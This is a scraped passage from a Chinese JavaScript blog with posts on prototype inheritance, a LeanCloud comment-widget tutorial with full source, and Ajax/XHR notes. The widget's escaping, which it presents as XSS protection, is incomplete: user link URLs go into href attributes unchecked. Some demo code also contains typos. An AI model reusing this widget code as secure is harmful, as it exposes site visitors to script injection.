Person();Person.prototype.sayHi = function(){\t//注意:1)这里是先创建实例,再修改的原型 2)用的不是字面量方式    alert(\"hi\");};friend.sayHi(); //\"hi\", 结果照样正常\ndemo2: 尝试字面量原型的动态性function Person(){\t//...}var person1 = new Person();Person.prototype = {    constructor: Person,    name : \"k\",    age : 23,    job : \"worker\",    sayName : function () {        alert(this.name);    }};person1.sayName();   //报错 person1.sayName is not a function ,此原型(原生原型)非彼原型(字面量重写的原型)\n原型模式的重要性不仅体现在创建自定义类型方面,就连所有原生的引用类型,都是采用这种模式 创建的.所有原生引用类型(Object、Array、String,等等)都在其构造函数的原型上定义了方法.\n但非常不建议修改原生对象的原型 .\n原型模式的缺点(没错,优点也可以是缺点)\n原型模式省略了为构造函数传递初始化参数这一环节,结果所有实例在 默认情况下都将取得相同的属性值。虽然这会在某种程度上带来一些不方便,但还不是原型的最大问题。 原型模式的最大问题是由其共享的本性所导致的。\n见demo :function Person(){}Person.prototype = {    constructor: Person,    name : \"k\",    friends:['k1','k2'] //数组是引用类型};var person1 = new Person();var person2 = new Person();var friends1 = person1.friends;var friends2 = person2.friends;person1.friends.push('k3');console.log(friends1);\t// k1,k2,k3console.log(friends2);\t// 注意这里变成了 k1,k2,k3\n这就是为什么几乎没人单纯用原型模式.\n解决方法 :\n组合使用构造函数模式和原型模式function Person(name,age){\tthis.name = name;\tthis,age = age;\tthis.friends=['k1','k2']; //什么?你不理解? 回想一下 new Function}Person.prototype = {    constructor: Person,\tsayName : function(){        alert(this.name);    }};var person1 = new Person('k1',22);var person2 = new Person('k2',22);var friends1 = person1.friends;var friends2 = person2.friends;person1.friends.push('k3');console.log(friends1);\t// k1,k2,k3console.log(friends2);\t// k1,k2\n这就是我们最常见的设计模式.不过这看起来貌似又有点问题, 构造函数和原型分别分开,看起来很不爽, 于是就有了下面:\n动态原型模式function Person(name,age){\tthis.name = name;\tthis,age = age;\tthis.friends=['k1','k2'];\tif (typeof this.sayName != \"function\"){\t    Person.prototype.sayName = function(){\t        alert(this.name);\t\t}; \t}}\n这已经几乎完美了.\n继承许多 OO 语言都支持两种继承方式:接口继承和 实现继承。接口继承只继承方法签名,而实现继承则继承实际的方法。如前所述,由于函数没有签名, 在 ECMAScript 中无法实现接口继承。\nJS继承主要是通过原型链来实现的.\n前面说了原型 , 原型链当然也很好理解, 打个可能不恰当的比喻 , 你有好几节水管,你想从厨房接到阳台, 但是哪一都段没法直接连接到你阳台, 因为每一节水管都太短了. 然而你可以将所有的水管一节一节的连起来, 这样就能达成目的了. 原型链就和这差不多: 对象a可以访问到原型A里面的属性和方法 ,假如原型A 又有一个原型B(也就是说原型A是原型B的一个实例),  这样的话对象a就能访问到原型B , 只要你喜欢,这个链能接更多…..\n见demo :function SuperType(){    this.property = true;}SuperType.prototype.getSuperValue = function(){    return this.property;};function SubType(){    this.subproperty = false;}SubType.prototype = new SuperType(); //这一步非常重要SubType.prototype.getSubValue = function (){    return this.subproperty;};var instance = new SubType();alert(instance.getSuperValue()); \t// true, 说明访问到了SuperType原型SubType.prototype.getSuperValue = function (){ //注意:1)没有使用字面量方式重写原型 2)这里的getSuperValue只是SubType原型里面的,而不是SuperType原型里面的    return false;};alert(instance.getSuperValue());   //false , 屏蔽了父类原型中同名属性(方法)\n好, 那么问题来了:function SuperType(){  this.arr = ['a','b']; //引用类型放在构造函数内, 妥妥的 :)}function SubType(){    //...}SubType.prototype = new SuperType();var instance = new SubType();var instance2 = new SubType();instance.arr.push('c');console.log(instance.arr);\t//[\"a\", \"b\", \"c\"] console.log(instance2.arr);\t//[\"a\", \"b\", \"c\"]\n到这里你可能疑惑, 我来给你解答 :当 SubType 通过原型链继承了 SuperType 之后,SubType.prototype 就变成了 SuperType 的一个实例, 因此它也拥有了一个它自己的 colors 属性等效于 我在SubType.prototype里面放置一个arr(引用类型)一样, 这就是原型链最大的问题 .\n解决办法\n借用构造函数见demo:function SuperType(){  this.arr = ['a','b'];}function SubType(){\tSuperType.call(this) //借用了父类的构造函数,补充说明,函数也是对象,对象就有属性和方法, call就是函数的方法之一.}var instance = new SubType();var instance2 = new SubType();instance.arr.push('c');console.log(instance.arr); //[\"a\", \"b\", \"c\"]console.log(instance2.arr); //[\"a\", \"b\"]\n注意事项:1) 传递参数function SuperType(name){    this.name = name;}function SubType(){\tSuperType.call(this, \"k\"); //继承了 SuperType,同时还传递了参数     this.age = 23;}var instance = new SubType();alert(instance.name);    //\"k\";alert(instance.age);     //23\n2) 问题function SuperType(){  this.arr = ['a','b'];}SuperType.prototype={\tconstructor:SuperType,\tname:'k',\tshow:function(){\t\tconsole.log(this.arr);\t}}function SubType(){\tSuperType.call(this)}var instance = new SubType();var instance2 = new SubType();instance.arr.push('c');console.log(instance.arr);console.log(instance2.arr);instance.show();\t//报错\n从上面例子可以看出, 如果仅仅使用借用构造函数实现继承的话, 父类原型中的属性和方法显然是不可见的, 那么问题又回到了构造函数模式存在的问题–函数复用的问题 .\n于是解决方法如下:\n组合继承使用原型链实现对原型属性和方法的继承,而通过借用构造函数来实现对实例属性的继承.这样,既通过在原型上定义方法实现了函数 复用,又能够保证每个实例都有它自己的属性.\n思考一下, 原型链继承和借用构造函数单独使用的时候都有问题, 组合在一起的时候问题就没了, 期中肯定发生了重写.function SuperType(name){    this.name = name;    this.colors = [\"red\", \"blue\", \"green\"];}SuperType.prototype.sayName = function(){    alert(this.name);￼};function SubType(name, age){ \tSuperType.call(this, name);  //第二次调用父类, 属性被重写\tthis.age = age;}SubType.prototype = new SuperType(); //第一次调用父类SubType.prototype.constructor = SubType;SubType.prototype.sayAge = function(){\talert(this.age);};\n原型式继承见demo:function object(o){\tfunction F(){}\tF.prototype=o;\treturn new F()}//问题:var person = {    name: \"Nicholas\",    friends: [\"Shelby\", \"Court\", \"Van\"] // 会被共享};var anotherPerson = object(person);anotherPerson.name = \"Greg\";anotherPerson.friends.push(\"Rob\");var yetAnotherPerson = object(person);yetAnotherPerson.name = \"Linda\";yetAnotherPerson.friends.push(\"Barbie\");alert(person.friends);   //\"Shelby,Court,Van,Rob,Barbie\"\n寄生式继承(类似于原型链继承)function object(o){\tfunction F(){}\tF.prototype=o;\treturn new F()}function createAnother(original){ \tvar clone=object(original); //通过调用函数创建一个新对象\tclone.sayHi = function(){\t    alert(\"hi\");\t}};return clone;\n寄生组合式继承略","url":"/2015/11/25/jquery-source-code-series/","link":"","plink":"https://thinkerchan.com/2015/11/25/jquery-source-code-series/"},{"title":"【快速教程】编写一个JS评论组件","content":"前言当初在老东家搬砖的时候, 负责评论组件这一块的前端重构。刚好17年年中那会, 国家法律要求所有能够发表言论的地方, 都得接入实名制, 于是用了很久的”多说”,也不免中枪,挂了。本来想着自己要不用前后端都写了, 弄一套开源的评论系统好了,结果从离职后到现在种种忙活都没写完(自我检讨中)。\n刚好前段时间用到LeanCloud这个还不错的产品(真没打广告), 继而发现了Valine这个评论组件, 接入了LeanCloud。\n那我干嘛还自己写评论系统（反正后端没写完）？直接用Valine不香吗。不过既然也写了一部分，那也改造下，算是一个入门级别的评论组件编写教程吧.\n另外说一句, Valine已经很完善了, 包括后面有人完善Valine-admin这样的辅助工具. 说这些也并非不建议大家重复造轮子. 只不过如果掌握了这个技能，就不要再做重复的事情。\n效果既然是demo,那只用ES6和css3开发, 只能用高级浏览器查看\n大概需求因为只有LeanCloud,没有自己的后台, 所以有些功能没法做(其实也不是没法做, 只是效果不好)\n@k 评论原型主要部分1.评论框复用 //√2.对用户输入进行转义 //√3.评论数据结构复用 //√4.异步加载样式表  // √5.Ajax  // 因为用了leancloud,所以直接用它的SDK6.留言排序可选 // × 直接从旧到新7. 基于localstorage存储网友的昵称/邮箱/网址8. md5拼接邮箱生成头像 //基于gavatar...TODO1. 留言点赞功能 //非限定次数(删除cookie依然可以点赞)2. 用户登录/注册  // 要做吗?3. 验证码  //需要后端配合5.表情处理(类似新浪微博处理方式比较合理) //✘6.楼层嵌套  //类似biliili7.分页8.楼层ID处理 // normal则不需要处理, 楼层嵌套则要过滤不含有targetFloor的cid\n源码麻雀虽小，五脏俱全。看了之后保证你也能写一个Valine了（正经脸）。;(function(win,doc) {  // https://leancloud.cn/docs/leanstorage_guide-js.html   let CONFIG = {     dataBase:'CMT', //创建一个表名     avatarUrl:'https://cdn.v2ex.com/gravatar/',  //默认头像 +md5(email)可做标识     sort:false,  //默认新旧排序     replyType: 'normal',     cmtType:'textarea',  //div, textarea     placeholder:\"欢迎灌水\",     lsPrefix:'CMT',     lsArr:['nick','email','link']   }   // 要存的数据结构   let cmtDataObj = {      comment: '',   // 评论内容      nick: '游客',  //昵称      email: '',  //用户邮箱      link: '',  //用户主页      ua: navigator.userAgent,      url: win.location.pathname.replace(/index\\.(html|htm)/, ''),      captcha: 0,      like: 0,      dislike:0,      targetFloor:''  //存储回复楼层的ID   };   // 辅助模块   let Tool = {     formatDate(date,bool){       const padWithZeros = (vNumber, width) =&gt; {         let numAsString = vNumber.toString();         while (numAsString.length &lt; width) {           numAsString = '0' + numAsString;         }         return numAsString;       }       let vDay = padWithZeros(date.getDate(), 2);       let vMonth = padWithZeros(date.getMonth() + 1, 2);       let vYear = padWithZeros(date.getFullYear(), 2);       if (bool) {         let vH = date.getHours();         let vM = date.getMinutes();         let vS = date.getSeconds();         function f(s){           return (''+s).length ==1? '0'+s : s;         }         return `${vYear}-${vMonth}-${vDay} ${f(vH)}:${f(vM)}:${f(vS)}`;       }else{         return `${vYear}-${vMonth}-${vDay}`;       }     },     // 格式化时间     formatTime(date){       let serTime = date.getTime();       let curTime = new Date().getTime();       let diff = curTime - serTime;       let day = Math.floor(diff / (24 * 3600 * 1000));       if (day === 0) {         let remainMsFromeH = diff % (24 * 3600 * 1000);         let hour = Math.floor(remainMsFromeH / (3600 * 1000));         if (hour === 0) {           let remainMsFromeM = remainMsFromeH % (3600 * 1000);           let minute = Math.floor(remainMsFromeM / (60 * 1000));           if (minute === 0) {             let remainMsFromeS = remainMsFromeM % (60 * 1000)             let second = Math.round(remainMsFromeS / 1000);             return second + ' 秒前';           }           return minute + ' 分钟前';         }         return hour + ' 小时前';       }       if (day &lt; 1) {         return day + ' 天前';       } else {         return this.formatDate(date)       }     }   }   // 模板模块   let TPL={     mainView(){       return `         &lt;div class=\"cmt-area cmt-postcomment\"&gt;           &lt;div class=\"cmt-area-hd\"&gt;             &lt;div class=\"cmt-area-tit\"&gt;网友评论&lt;/div&gt;             &lt;div class=\"cmt-count-wrap\"&gt;共有&lt;span class=\"cmt-count\"&gt;0&lt;/span&gt;条评论&lt;/div&gt;           &lt;/div&gt;         &lt;/div&gt;         &lt;div class=\"cmt-content\"&gt;           &lt;ul class=\"cmt-list\" id=\"JcmtList\"&gt;&lt;/ul&gt;         &lt;/div&gt;       `     },     cmtFormTpl(bool){ //评论框模板        // div+contenteditable , 默认转义用户输入 ,textarea等,不会被转义,要过滤       let con = null;       if (CONFIG.cmtType=='div') {         con = '&lt;div class=\"cmt-main-txtarea\" contenteditable id=\"{{cmtId}}\" placeholder=\"'+CONFIG.placeholder+'\"&gt;&lt;/div&gt;'       }else{         con = '&lt;textarea class=\"cmt-main-txtarea\" placeholder=\"'+CONFIG.placeholder+'\" id=\"{{cmtId}}\"&gt;&lt;/textarea&gt;'       }       let hd = null;       if (!bool) {          hd =`&lt;div class=\"cmt-login-area\"&gt;             &lt;input  class=\"cmt-login-ipt\" placeholder=\"昵 称\" id=\"Jnick\" data-name=\"nick\"/&gt;             &lt;input  class=\"cmt-login-ipt\" placeholder=\"邮 箱\" id=\"Jemail\" data-name=\"email\"/&gt;             &lt;input  class=\"cmt-login-ipt\" placeholder=\"个人网站\" id=\"Jlink\" data-name=\"link\"/&gt;           &lt;/div&gt;`;       }else{          hd=''       }       return `         &lt;div class=\"cmt-area-bd\"&gt;            ${hd}           &lt;div class=\"cmt-main-txtarea-wrap\"&gt;             ${con}           &lt;/div&gt;         &lt;/div&gt;         &lt;div class=\"cmt-area-ft\"&gt;           &lt;a  class=\"btn cmt-main-txtarea-sbmt-btn\" data-event=\"{{eventType}}\"&gt;{{btnTxt}}&lt;/a&gt;         &lt;/div&gt;       `     },     cmtItemTpl(){ //评论数据模板       return `         &lt;div class=\"cmt-user-avatar\"&gt;           &lt;a href=\"{{userCenter}}\" class=\"user-center-link\" target=\"_blank\"&gt;             &lt;img class=\"user-avatar-img\" src=\"{{avatarUrl}}\"&gt;           &lt;/a&gt;         &lt;/div&gt;         &lt;div class=\"cmt-item-data-wrap\" id=\"{{objectId}}\" data-placeholder=\"{{userName}}\"&gt;           &lt;div class=\"cmt-item-data-hd\"&gt;             &lt;span class=\"cmt-item-data-floor\"&gt;#{{floor}}&lt;/span&gt;             &lt;span class=\"cmt-item-data-user\"&gt;{{userName}}&lt;/span&gt;             &lt;span class=\"cmt-item-data-time\"&gt;{{createTime}}&lt;/span&gt;           &lt;/div&gt;           &lt;p class=\"cmt-item-data\"&gt;{{cmtData}}&lt;/p&gt;           &lt;div class=\"cmt-item-data-hd-ft\"&gt;             &lt;a class=\"cmt-item-reply-btn\" data-event=\"reply\" data-id=\"{{objectId}}\"&gt;回复&lt;/a&gt;           &lt;/div&gt;           &lt;ul class=\"reply-list\" id=\"{{UlId}}\"&gt;             &lt;!--placeholder--&gt;           &lt;/ul&gt;         &lt;/div&gt;     `},   }   // 主要逻辑   let CMT = {     init(configObj){       if (!configObj.el) {         console.log('缺少目标容器');         return;       }       if (!configObj.appId) {        console.log('请填写appId');        return;       }       if (!configObj.appKey) {        console.log('请填写appKey');        return;       }       if(typeof MD5=='undefined'){        this.MD5=function(str){return str};       }else{        this.MD5=MD5;       }       AV.init(configObj.appId, configObj.appKey);       this.el = document.querySelector(configObj.el);       // 渲染模板       this.buildTpl();       // 出所有评论       this.renderAllCmt();       // 绑定各种事件       this.bindEvent();       // 读取localstorage       this.fetchUserInfo();     },     buildTpl(){       this.generateMainView();  //主界面结构       this.generateForm({ // 生成主评论框         cmtId : 'JmainCmt',         eventType: 'postCmt',         btnTxt: '提交评论',         callBack:(newCmtEle)=&gt;{           doc.querySelector('.cmt-postcomment').appendChild(newCmtEle);         }       });     },     generateReplyForm(cb){       this.generateForm({  // 生成回复框, 初始状态隐藏         cmtId : 'JreplyCmt',         eventType: 'postReply',         btnTxt: '提交回复',         hideLoginArea:true,         callBack:(newCmtEle)=&gt;{           this.replyForm =  newCmtEle.cloneNode(true);           cb &amp;&amp; cb();         }       });     },     generateMainView(){       this.el.innerHTML = TPL.mainView()     },     generateForm(configObj){       let div = doc.createElement('div')       div.classList +='cmt-area-con';       div.innerHTML = TPL.cmtFormTpl(configObj.hideLoginArea)         .replace(/{{eventType}}/g,configObj.eventType)         .replace(/{{btnTxt}}/g,configObj.btnTxt)         .replace(/{{cmtId}}/g,configObj.cmtId);       configObj.callBack &amp;&amp; configObj.callBack(div);     },     getData(el,name){       return el.getAttribute('data-'+name)     },     setData(el,name,val){       el.setAttribute('data-'+name,val)     },     setPlaceHolder(cmtEle){      if (CONFIG.replyType=='div') {        // div+css下不能动态更新placeholder        cmtEle.setAttribute('placeholder', '回复@'+this.placeholder+':')      }else{       cmtEle.placeholder = '回复@'+this.placeholder+':';      }     },     checkInput(cmtEle){       return CONFIG.cmtType=='div'? cmtEle.innerHTML.trim().length : cmtEle.value.trim().length;     },     setFocus(cmtEle){       cmtEle.focus();       if (CONFIG.cmtType=='div') {         let range = win.getSelection();         range.selectAllChildren(cmtEle);         range.collapseToEnd();       }     },     safeTxt(con){      return con.replace(/&lt;/ig, '&amp;lt;').replace(/&gt;/ig, '&amp;gt;')     },     getContent(cmtEle) {       return this.getCleanText(cmtEle)         .replace(/&lt;/ig, '&amp;lt;')         .replace(/&gt;/ig, '&amp;gt;');     },     randomID(prefix) {       return prefix + Math.random().toString(32).slice(2);     },     stripTags: function(el, tagName) {       let els = el.getElementsByTagName(tagName.toUpperCase());       for (let i = 0; i &lt; els.length; i++) {         while (els[i].firstChild)           els[i].parentNode.insertBefore(els[i].removeChild(els[i].firstChild), els[i]);         els[i].parentNode.removeChild(els[i--]);       }     },     getCleanText(cmtEle) {       let ele = cmtEle;       let clone = ele.cloneNode(true);       let _v = null;       if(CONFIG.cmtType=='div'){         clone.innerHTML = this.html2txt(clone.innerHTML);         this.stripTags(clone, '*');         _v = clone.innerHTML.replace(/(?:\\s|&amp;nbsp;)*$/g, '');       }else{         clone.value = this.html2txt(clone.value);         this.stripTags(clone, '*');         _v = clone.value.replace(/(?:\\s|&amp;nbsp;)*$/g, '');       }       return _v;     },     html2txt(html) {       let res = html.replace(/&amp;nbsp;/igm, ' ')         .replace(/(?:&lt;br\\s*\\\\?&gt;)+/igm, '\\n')         .replace(/&lt;div&gt;(.*?)&lt;\\/div&gt;/igm, \"\\n$1\")         .replace(/&lt;p&gt;(.*?)&lt;\\/p&gt;/igm, \"\\n$1\");       return res;     },     clearCmt(cmtEle){       if (CONFIG.cmtType=='div') {         cmtEle.innerHTML = ''       }else{         cmtEle.value = ''       }     },     renderCmt(configObj){       let ret = configObj.ret,         newInsert = configObj.newInsert;       let targetFloor = ret.get('targetFloor'),         hasTargetFloor =!!targetFloor,         _objectId = ret.get('objectId'),  //留言id         con = decodeURIComponent(ret.get('comment')),         _floor = ret.cid.split('c')[1],         // 昵称,个人网址要记得防XSS         _email = ret.get('email'),         _nick = this.safeTxt(ret.get('nick')),         _link = ret.get('link'),         _time = Tool.formatTime(ret.get('createdAt'));       let _con = '', tpl = '',avatarUrl='';       if (!!_email) {        avatarUrl =CONFIG.avatarUrl+this.MD5(_email)+'?s=50&amp;d=identicon';       }else{        avatarUrl = CONFIG.avatarUrl       }       if (hasTargetFloor) {         _con = '&lt;i&gt;@'+this.cache[targetFloor].get('nick')            +' #'+this.cache[targetFloor].cid.split('c')[1]            +' &lt;/i&gt;'+con;       }else{         _con = con;       }       tpl = TPL.cmtItemTpl()         .replace(/{{objectId}}/g,_objectId)         .replace(/{{floor}}/g,_floor)         .replace(/{{userName}}/g,_nick)         .replace(/{{userCenter}}/g,(!!_link?this.safeTxt(_link):'javascript:;'))         .replace(/{{createTime}}/g,(newInsert?'刚刚':_time))         .replace(/{{cmtData}}/g,_con)         .replace(/{{avatarUrl}}/g,avatarUrl)       let ele = doc.createElement('li');       ele.classList ='cmt-item';       ele.innerHTML = tpl;       return ele;     },     getAllComments(cb){       let query = new AV.Query(CONFIG.dataBase);       // 根据页面URL(或者页面标题)来查找对应的评论       query.equalTo('url', cmtDataObj['url']);       if (CONFIG.sort) {         query.descending('createdAt');  //从新到旧       }else{         query.ascending('createdAt');  //从旧到新       }       query.find().then((ret)=&gt;{         this.setCache(ret);         this.setCmtNum();         cb &amp;&amp; cb(ret)       })     },     setCache(ret){       this.cache = {};       for (var i = 0; i &lt; ret.length; i++) {         this.cache[ret[i].id] = ret[i];       }     },     updateCache(obj){       this.cache[obj.id] = obj;       this._len = Object.getOwnPropertyNames(this.cache).length;     },     renderAllCmt(){       this.getAllComments((ret)=&gt;{         if (CONFIG.replyType=='normal') {           let fragment = doc.createDocumentFragment();           for (let i = 0; i &lt; ret.length; i++) {             fragment.appendChild(this.renderCmt({               ret:ret[i],               newInsert:false             }));           }           JcmtList.appendChild(fragment);         }       })     },     renderNewCmt(ret){       let li = this.renderCmt({         ret:ret,         newInsert:true       });       // 判断插入位置       function normalSort(parent){         if (CONFIG.sort) {           parent.prepend(li);         }else{           parent.appendChild(li);         }       }       normalSort(JcmtList);     },     setCmtNum(){       let ele = doc.querySelector('.cmt-count')       this._len = Object.getOwnPropertyNames(this.cache).length;       ele.innerHTML = this._len;     },     saveComment(sucess,fail){       let av = AV.Object.extend(CONFIG.dataBase);       let instance = new av();       for (let i in cmtDataObj) {         if (cmtDataObj.hasOwnProperty(i)) {           let _v = cmtDataObj[i];           instance.set(i, _v);         }       }       instance.save().then((ret)=&gt;{         this.updateCache(ret);         sucess &amp;&amp; sucess(ret);       }, function (error) {         fail &amp;&amp; fail(error);       });     },     postData(configObj){       let cmtEle = configObj.cmtEle,         sucess = configObj.sucess,         fail = configObj.fail;       let len = this.checkInput(cmtEle)       if (len==0) {         alert('请输入评论');         this.setFocus(cmtEle) //评论框         return !1;       }       let html = this.getContent(cmtEle);       cmtDataObj.comment = html; //挂载到数据包       // 读取最后的用户数据       for (let i = 0; i &lt; CONFIG.lsArr.length; i++) {        let v = localStorage[CONFIG.lsPrefix+CONFIG.lsArr[i]];        if (!!v) {           cmtDataObj[CONFIG.lsArr[i]] = v;        }       }       cmtEle==JmainCmt &amp;&amp; (cmtDataObj.targetFloor=''); // 主评论没有目标楼层       this.saveComment((ret)=&gt;{         this.renderNewCmt(ret);         this.clearCmt(cmtEle);         this.setCmtNum();         sucess &amp;&amp; sucess()       },(error)=&gt;{         console.log(error)         fail &amp;&amp; fail()       });     },     insertReplyForm(wrap){       this.lastId = wrap.id;       wrap.appendChild(this.replyForm);       this.setData(wrap,'status','1');       this.setPlaceHolder(JreplyCmt);       this.replyForm.style.display = 'block';       this.setFocus(JreplyCmt);       cmtDataObj.targetFloor = this.lastId;     },     removeReplyForm(cb){       let lastTarget =  doc.getElementById(this.lastId)       this.setData(lastTarget,'status','0')       this.replyForm.style.display = 'none';       doc.getElementById(this.lastId).removeChild(this.replyForm);       cb &amp;&amp; cb()     },     toggleReplyForm(wrap,isShowed){       if (isShowed == '1') {         this.setData(wrap,'status','0')         this.replyForm.style.display = 'none';       }else{         this.setData(wrap,'status','1')         this.setPlaceHolder(JreplyCmt)         this.replyForm.style.display = 'block';         this.setFocus(JreplyCmt);       }     },     fetchUserInfo(){      let lsArr = CONFIG.lsArr;      for (let i = 0; i &lt; lsArr.length; i++) {        let ipt = doc.getElementById('J'+lsArr[i]);        ipt.value = localStorage.getItem(CONFIG.lsPrefix+lsArr[i]);      }     },     bindEvent(){       let clickHandler = (e)=&gt;{         let target = e.target         let eventType = this.getData(target,'event');         switch(eventType){           case 'postCmt' :             this.postData({               cmtEle: JmainCmt,               sucess:()=&gt;{},               fail:()=&gt;{}             });             break;           case 'postReply' :             this.postData({               cmtEle:JreplyCmt,               sucess:()=&gt;{                 this.toggleReplyForm(doc.getElementById(this.lastId),'1');               },               fail:()=&gt;{}             });             break;           case 'reply' :             let targetId = this.getData(target,'id'); // 按钮存储objectId             let wrap = doc.getElementById(targetId),               isShowed = this.getData(wrap,'status');             this.placeholder = this.getData(wrap,'placeholder');             if (this.lastId==null) {               this.generateReplyForm(()=&gt;{                 this.insertReplyForm(wrap);               });             }else{               if (this.lastId==wrap.id) {                 this.toggleReplyForm(wrap,isShowed)               }else{                 this.removeReplyForm(()=&gt;{                   this.insertReplyForm(wrap);                   this.toggleReplyForm(wrap,isShowed)                 });               }             }             break;           default:         }       }      let keyUpHandler = (e)=&gt;{        e.preventDefault();        let target = e.target;        let itemName = this.getData(target,'name');        let v =  target.value.trim();        switch (itemName) {          case 'nick':            localStorage.setItem(CONFIG.lsPrefix+'nick', v);            break;          case 'email':            localStorage.setItem(CONFIG.lsPrefix+'email', v);            break;          case 'link':            localStorage.setItem(CONFIG.lsPrefix+'link', v);            break;          default:            break;        }       }       doc.body.addEventListener('click',clickHandler,false);       Jnick.addEventListener('keyup',keyUpHandler,false);       Jemail.addEventListener('keyup',keyUpHandler,false);       Jlink.addEventListener('keyup',keyUpHandler,false);     }   }   win.CMT = CMT;})(window,document);\n其他把手头的活干完, 再继续完善Todo吧","url":"/2018/09/30/编写一个JS评论组件/","link":"","plink":"https://thinkerchan.com/2018/09/30/编写一个JS评论组件/"},{"title":"JS红皮书读书笔记-21-Ajax与Comet","content":"Ajax，是对 Asynchronous JavaScript + XML 的简写。\nAjax 技术的核心是 XMLHttpRequest 对象（简称 XHR），这是由微软首先引入的一个特性，其他浏览器提供商后来都提供了相同的实现。在 XHR 出现之前，Ajax 式的通信必须借助一些 hack 手段来实现，大多数是使用隐藏的框架或内嵌框架。XHR 为向服务器发送请求和解析服务器响应提供了流畅的接口。能够以异步方式从服务器取得更多信息，意味若用户单击后，可以不必刷新页面也能取得新数据。也就是说，可以使用 XHR 对象取得新数据，然后再通过 DOM 将新数据插入到页面中。\n另外，虽然名字中包含 XML 的成分，但 Ajax 通信与数据格式无关；这种技术就是无须刷新页面即可从服务器取得数据，但不一定是 XML 数据。\nXMLHttpRequest对象IE5 是第一款引入 XHR 对象的浏览器。在 IE5 中，XHR 对象是通过 MSXML 库中的一个 ActiveX对象实现的。因此，在  IE 中可能会遇到三种不同版本的  XHR 对象，即  MSXML2.XMLHttp 、MSXML2.XMLHttp.3.0 和 MXSML2.XMLHttp.6.0。\n针对旧版IE://适用于 IE7 之前的版本function createXHR(){  if (typeof arguments.callee.activeXString != \"string\"){    var versions = [    \"MSXML2.XMLHttp.6.0\",     \"MSXML2.XMLHttp.3.0\",     \"MSXML2.XMLHttp\"    ], i, len;    for (i=0,len=versions.length; i &lt; len; i++){       try {        new ActiveXObject(versions[i]);         arguments.callee.activeXString = versions[i];         break;      } catch (ex){      }    }  }  return new ActiveXObject(arguments.callee.activeXString);}\n主流浏览器:var xhr = new XMLHttpRequest();\n创建好了这个xhr对象, 才能进行后续的操作.\nXHR的用法在使用 XHR 对象时，要调用的第一个方法是 open()，它接受 3 个参数：要发送的请求的类型（”get”、”post”等）、请求的 URL 和表示是否异步发送请求的布尔值。下面就是调用这个方法的例子。\nxhr.open(\"get\", \"example.php\", false);\n这行代码会启动一个针对 example.php 的 GET 请求。有关这行代码，需要说明两点：一是 URL 相对于执行代码的当前页面（当然也可以使用绝对路径）；二是调用 open()方法并不会真正发送请求，而只是启动一个请求以备发送。\n\n同步请求\n要发送特定的请求，还必须像下面这样调用 send()方法：\nxhr.open(\"get\", \"example.txt\", false); //主要这个是同步请求xhr.send(null);\t//如不需要发送数据则不用传参数, 但是有些浏览器会报错, 故统一传null做兼容\n由于这次请求是同步的，JavaScript 代码会等到服务器响应之后再继续执行。在收到响应后，响应的数据会自动填充 XHR 对象的属性，相关的属性简介如下:\n\nresponseText：作为响应主体被返回的文本。\nresponseXML：如果响应的内容类型是”text/xml”或”application/xml”，这个属性中将保存包含若响应数据的 XML DOM 文档。\nstatus：响应的 HTTP 状态。\nstatusText：HTTP 状态的说明。\n\n同步请求常规用法:var xhr  = new XMLHttpRequest();    xhr.open(\"GET\",\"api.txt\",false);\t// 同步请求    xhr.send(null);    if ( (xhr.status &gt;=200 &amp;&amp; xhr.status&lt;300) || xhr.status == 304) {\t// 注意文明常用 xhr.status做检测, 比较靠谱      console.log(xhr.statusText)    }else{      console.log(xhr.status)    }    console.log('api.txt get')\t// 验证同步执行\n除非你硬要这么做, 否则开发中是几乎用不到ajax的同步请求.\n\n异步请求\n多数情况下，我们还是要发送异步请求，才能让JavaScript 继续执行而不必等待响应。此时，可以检测 XHR 对象的 readyState 属性，该属性表示请求/响应过程的当前活动阶段。这个属性可取的值如下:\n\n0：未初始化。尚未调用 open()方法。\n1：启动。已经调用 open()方法，但尚未调用 send()方法。\n2：发送。已经调用 send()方法，但尚未接收到响应。\n3：接收。已经接收到部分响应数据。\n4：完成。已经接收到全部响应数据，而且已经可以在客户端使用了。\n\n只要 readyState 属性的值由一个值变成另一个值，都会触发一次 readystatechange 事件。可以利用这个事件来检测每次状态变化后 readyState 的值。通常，我们只对 readyState 值为 4 的阶段感兴趣，因为这时所有数据都已经就绪。\n\n不过，必须在调用 open()之前指定 onreadystatechange 事件处理程序才能确保跨浏览器兼容性。\n\nfunction asyncFn(){     var xhr = new XMLHttpRequest();     // xhr.onreadystatechange为异步方法, 原本放在前面或者后面影响不大, 但是因为浏览器兼容, 建议放xhr.open前面     xhr.onreadystatechange = function(){\t//注意这里采用的是DOM0的写法, 保证最大兼容性       if (xhr.readyState == 4){ // 没有用this代替xhr对象是因为兼容浏览器         if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){           console.log(xhr.responseText);         } else {           console.log(\"Request was unsuccessful: \" + xhr.status);         }       }     };     xhr.open(\"get\", \"api.txt\", true);     xhr.send(null);\t//xhr.abort(); //如果有必要, 是可以再响应接受到之前取消这次异步请求.   }   asyncFn();   console.log('api.txt get')\t//证明它先输出,说明异步\nHttp头部信息每个 HTTP 请求和响应都会带有相应的头部信息，其中有的对开发人员有用，有的也没有什么用。\nXHR 对象也提供了操作这两种头部（即请求头部和响应头部）信息的方法。默认情况下，在发送 XHR 请求的同时，还会发送下列头部信息。\n\nAccept：浏览器能够处理的内容类型。\nAccept-Charset：浏览器能够显示的字符集。\nAccept-Encoding：浏览器能够处理的压缩编码。\nAccept-Language：浏览器当前设置的语言。\nConnection：浏览器与服务器之间连接的类型。\nCookie：当前页面设置的任何 Cookie。\nHost：发出请求的页面所在的域 。\nReferer：发出请求的页面的 URI。注意，HTTP 规范将这个头部字段拼写错了，而为保证与规范一致，也只能将错就错了。（这个英文单词的正确拼法应该是 referrer。）\nUser-Agent：浏览器的用户代理字符串。\n\n虽然不同浏览器实际发送的头部信息会有所不同，但以上列出的基本上是所有浏览器都会发送的。使用 xhr.setRequestHeader()方法可以设置自定义的请求头部信息。这个方法接受两个参数：头部字段的名称和头部字段的值。并且这个方法要在xhr.open和xhr.send之间使用: \nxhr.onreadystatechange = function(){  if (xhr.readyState == 4){ // 没有用this代替xhr对象是因为兼容浏览器    if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304){      console.log(xhr.responseText);\t\t// 获取响应头      var hd = xhr.getResponseHeader('userName');      var hds = xhr.getAllResponseHeaders();      console.log(hds)    } else {      console.log(\"Request was unsuccessful: \" + xhr.status);    }  }};xhr.open(\"get\", \"api.txt\", true);xhr.setRequestHeader('userName', 'testdog');  //注意必须在中间, 